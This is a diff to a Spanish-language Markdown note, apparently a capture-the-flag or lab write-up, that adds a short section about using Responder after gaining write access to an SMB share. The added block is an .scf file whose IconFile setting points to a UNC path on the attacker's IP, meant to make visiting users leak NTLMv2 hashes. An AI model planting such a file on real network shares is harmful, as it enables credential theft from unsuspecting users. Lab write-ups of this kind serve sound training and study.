@@ -129,7 +129,16 @@ con este usuario tenemos permisos de lectura y de escritura en el recurso `Share
 ![[Pasted image 20240810134450.png]]
 
 ### Responder
-en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algun otro usuario intenta acceder a este recurso y asi poder obtener un segundo hash `NTMLv2` 
+en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algún otro usuario intenta acceder a este recurso y así poder obtener un segundo hash `NTMLv2` 
+
+```python
+[Shell]
+   2   │ Command=2
+   3   │ IconFile=\\10.10.14.8\share\hello.ico
+   4   │ [Taskbar]
+   5   │ Command=ToggleDesktop
+```
+
 ![[Pasted image 20240810140010.png]]
 
 
